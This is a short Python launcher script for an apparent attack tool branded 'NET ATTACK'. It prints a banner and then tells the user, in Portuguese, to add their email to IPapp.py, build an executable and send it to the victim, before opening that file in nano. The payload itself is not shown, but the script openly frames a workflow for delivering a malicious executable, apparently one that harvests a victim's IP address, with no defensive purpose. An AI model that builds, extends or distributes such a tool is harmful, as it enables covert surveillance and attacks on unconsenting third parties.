import os, time, sys
os.system('cls')
#os.system('clear')
verde = '\033[32m'
vermelho = '\033[31m'
nulo = '\033[0m'
print (f'''
{verde}███╗░░██╗███████╗████████╗{nulo}    {vermelho}░█████╗░████████╗░█████╗░░█████╗░██╗░░██╗{nulo}
{verde}████╗░██║██╔════╝╚══██╔══╝{nulo}    {vermelho}██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝{nulo}
{verde}██╔██╗██║█████╗░░░░░██║░░░{nulo}    {vermelho}███████║░░░██║░░░███████║██║░░╚═╝█████═╝░{nulo}
{verde}██║╚████║██╔══╝░░░░░██║░░░{nulo}    {vermelho}██╔══██║░░░██║░░░██╔══██║██║░░██╗██╔═██╗░{nulo}
{verde}██║░╚███║███████╗░░░██║░░░{nulo}    {vermelho}██║░░██║░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗{nulo}
{verde}╚═╝░░╚══╝╚══════╝░░░╚═╝░░░{nulo}    {vermelho}╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝{nulo}''')
time.sleep(0.50)
z = '𝑩𝒀: 𝑺𝑳𝑨𝒀𝑬𝑹🐍'

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.2)
print('')
print('em 10 segundos, ira abrir o none, adicione o seu email e crie o executavel executando o comando abaixo. apos isso mande o executavel para a vitima')

time.sleep(15)

os.system('nano IPapp.py')


